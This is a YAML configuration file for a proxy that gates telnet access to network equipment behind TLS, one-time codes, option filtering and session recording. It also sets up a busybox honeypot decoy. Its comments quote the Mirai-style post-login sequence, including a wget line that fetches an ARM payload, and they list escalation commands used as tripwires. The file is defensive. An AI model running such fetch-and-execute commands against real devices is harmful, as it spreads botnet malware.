# A telnet gateway for the equipment that speaks nothing else: the
# proxy is a telnet server to the operator and a telnet client to the
# device, reading the NVT protocol of RFC 854 in both directions.
#
# Telnet carries everything in clear. The session, every password
# typed into the device's own login, and the one-time code this
# listener asks for all cross the network as plain bytes. The tls
# section below is the only thing that changes that -- it is what
# "telnets" on 992 is -- and validation warns every time it is left
# off. This listener exists because the equipment exists, not because
# telnet is acceptable.
#
# Why this is not a tcp listener: telnet's options are commands
# escaped into the byte stream (IAC, 255, begins one). A proxy that
# does not parse that cannot tell a window-size negotiation from the
# characters a person typed -- which it has to, to record the session
# as it was seen, to decide which options may be turned on, and to ask
# its own question before the device is dialled.
#
# Validate: xgate -config examples/bastion/telnet.yaml -validate
version: 1
server:
  listeners:
    # Switches, PDUs and consoles: reached over TLS, after a code,
    # with the session on disk.
    - name: equipment
      address: "0.0.0.0:992"
      kind: telnet
      # Little equipment reconnects in a hurry, and nothing legitimate
      # here connects twice a second.
      connection_rate: {per_second: 10, burst: 20}
      connection_rate_per_source: {per_second: 1, burst: 3}
      # telnets. Without it the code this listener asks for travels in
      # clear to anyone on the path, which makes the factor theatre.
      tls:
        certificates:
          - {cert_file: /etc/xproxy/certs/telnet.pem, key_file: /etc/xproxy/certs/telnet-key.pem}
        min_version: "1.2"
      telnet:
        upstream: equipment

        # Naming the equipment here would save an attacker a question.
        banner: |
          Access to this system is logged. Disconnect now if you are
          not authorised to use it.

        # Telnet has no authentication for a proxy to read, so this is
        # a prompt the gateway writes into the stream and an answer it
        # reads back, before the device is dialled at all: a client
        # that cannot answer never reaches the equipment. The name is
        # only what the enrolment is looked up by -- the device's own
        # login happens afterwards and is untouched.
        mfa:
          file: /etc/xproxy/mfa
          issuer: example.com
          skew: 1
          require_enrolment: true
          max_failures: 5
          window: 5m
          lockout: 15m

        # The default list is what an interactive session needs and
        # nothing else, restated here so the omissions are visible.
        # Left out, each for its own reason:
        #
        #   environ, new-environ  carry variables of the client's
        #                         choosing to the device, which is how
        #                         a login shell is handed a different
        #                         PATH
        #   x-display             names an X display the device will
        #                         try to reach: a connection back out
        #   authentication        negotiated differently by every
        #                         implementation that has it
        #   encryption            would encrypt the session end to end,
        #                         so the gateway could neither record
        #                         it nor hold it to a policy
        #
        # An option the proxy has no name for is refused whatever this
        # says, and a refusal is answered to the side that asked
        # rather than dropped -- a refusal the asker never hears is a
        # negotiation that repeats forever.
        allow_options: [echo, suppress-go-ahead, binary, terminal-type, naws,
                        terminal-speed, end-of-record, timing-mark, status]

        # A peer that sends IAC SB and never sends IAC SE is cut off
        # here rather than allowed to grow a buffer.
        max_subnegotiation: 4096

        # What the device showed, in the asciicast v2 format the ssh
        # bastion writes, so the same player replays it. naws gives it
        # the window size and a resize during the session is recorded
        # as one.
        #
        # input is off. On telnet it would mean recording every
        # password typed into the device's own login -- which the
        # gateway does not otherwise see -- so the difference between
        # watching over a shoulder and running a keylogger is sharper
        # here than anywhere else in this estate.
        recording:
          directory: /var/log/xproxy/sessions
          max_file_bytes: 33554432
          max_files: 2000

        idle_timeout: 10m
        session_timeout: 4h
        max_connections: 200
        allow_clients: ["10.10.0.0/16"]

    # ---------------------------------------------------------------
    # A login that is not there.
    #
    # A honeypot on the same network as the equipment, with nothing
    # behind it. Nothing on this estate is configured to use it, so a
    # client that arrives either found it by scanning or is running
    # something it should not be.
    #
    # What arrives on port 23 is not a person: it is a dictionary. The
    # Mirai family and everything written after it walk the credentials
    # that shipped on recorders, cameras and routers. Refusing collects
    # the address the firewall log already had; answering collects the
    # list, and then the four exchanges that follow a login:
    #
    #   /bin/busybox MIRAI       is it busybox, and which one
    #   echo -e '\x6b...'        is anything actually reading this
    #   cat /proc/cpuinfo        which payload do I need
    #   wget http://.../x.arm7   and here is where it lives
    #
    # That last line is the one nothing else here produces.
    # ---------------------------------------------------------------
    - name: legacy-spare
      address: "10.10.0.23:23"
      kind: telnet
      telnet:
        # No upstream: there is no equipment. No mfa and no
        # require_grant either -- the fabrication's own login prompt is
        # the trap and accepts everybody, so a factor in front of it
        # would refuse the visitors it exists to collect. Validation
        # refuses both rather than ignoring them.
        #
        # And no tls: an unencrypted telnet port is what the scanning is
        # looking for, so this is the one telnet listener that should not
        # have one.
        deception:
          mode: decoy

          # What is actually on port 23. `linux` is the other profile,
          # for a listener impersonating a small server.
          profile: busybox

          # Name it after something this estate really has. A visitor
          # who finds a recorder called "dvr" on a site whose recorders
          # are called something else has found the fabrication.
          hostname: cam-07

          # Two credentials taken before the login is accepted, which is
          # what a real device's login looks like and collects more of
          # the dictionary. Which credential it was makes no difference
          # to the outcome: a login that accepted the right password and
          # refused the wrong one would be a credential oracle.
          attempts: 2

          # The escalation is already a tripwire and needs no listing:
          # wget, curl, tftp, chmod, nohup, insmod, crontab, iptables,
          # busybox, and the file names a credential lives in. This is
          # the command that is interesting on this estate and nowhere
          # else.
          tripwire: [payroll-export]

          # The transcript is worth keeping: it is the commands, and the
          # login is not in it -- the credential was already reduced to a
          # length and a handle before the file was opened.
          #
          # input: true records what was typed, which on a fabrication is
          # the point and carries no real password.
        recording:
          directory: /var/log/xproxy/sessions
          input: true
          max_file_bytes: 8388608
          max_files: 2000
        idle_timeout: 5m
        session_timeout: 30m
        max_connections: 200


upstreams:
  - name: equipment
    endpoints:
      - {address: "10.50.1.10:23"}
      - {address: "10.50.1.11:23"}
    timeouts: {connect: 5s}

bans:
  triggers:
    # A failed code, a refused option and a client from outside
    # allow_clients are all telnet_denied. The threshold is low: this
    # is a port with a handful of legitimate users on a network that
    # should not be carrying strangers.
    # A tripwire on a fabrication nothing is configured to use is about
    # as clear a signal as this estate produces, so it acts on the first.
    - name: telnet-decoy
      reasons: [telnet_tripwire]
      threshold: 1
      window: 1h
      duration: 24h
    - name: telnet-abuse
      reasons: [telnet_denied]
      threshold: 5
      window: 10m
      duration: 4h

logging:
  access: {enabled: true}
